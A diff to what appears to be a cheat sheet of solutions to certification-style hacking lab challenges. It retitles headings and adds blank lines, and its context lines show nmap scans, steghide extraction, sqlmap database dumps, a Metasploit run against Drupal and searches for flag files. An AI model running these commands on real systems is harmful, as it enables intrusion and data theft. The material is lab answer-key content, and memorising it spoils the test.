@@ -38,7 +38,7 @@ nmap -sV -p 25,80,110,143 172.20.0.0/24
 
 
 
-3. RDP → hide.cfe → CRC32
+3. RDP
 
 Solution 1
 
@@ -60,6 +60,7 @@ get hide.cfe
 steghide extract -sf hide.cfe
 
 crc32 image.jpg
+
 
 4. Android Hidden Data
 
@@ -91,7 +92,8 @@ adb pull <image>
 steghide extract -sf image.jpg
 
 
-5. Vulnerability Scan → CVE
+
+5. Vulnerability Scan-
 
 Solution 1
 
@@ -100,6 +102,7 @@ OpenVAS
 Solution 2
 
 nmap -Pn --script vuln <target_ip>
+
 
 
 6. Netnormal.txt
@@ -122,7 +125,8 @@ nmap -p 22 --open <subnet>
 find / -type f -name Netnormal.txt 2>/dev/null
 
 
-8. SMB → Sniffer.txt
+
+8. SMB
 
 Solution 1
 
@@ -149,7 +153,9 @@ get Sniffer.txt
 
 cat Sniffer.txt
 
-13. cinema.cehorg.com SQL Injection
+
+
+13. SQL Injection
 
 Solution 1
 
@@ -184,7 +190,8 @@ sqlmap -u "<url>" --cookie="<cookie>" -D db_name --tables
 sqlmap -u "<url>" --cookie="<cookie>" -D db_name -T table_name --dump
 
 
-15. Drupalgeddon2 → Flag.txt
+
+15. Drupal
 
 Solution 1
 
@@ -201,6 +208,7 @@ set RPORT 80
 run
 
 find / -name Flag.txt 2>/dev/null
+
 
 
 Solution 2
@@ -250,7 +258,7 @@ cat Flag.txt
 
 
 
-16. SQLi Flag Challenge
+16. SQLi
 
 Solution 1
 
@@ -278,7 +286,7 @@ sqlmap -u <url> -D db_name -T table_name -C column_name --dump
 
 
 
-18. MQTT Topic Length
+18. IoT
 
 Solution 1
 
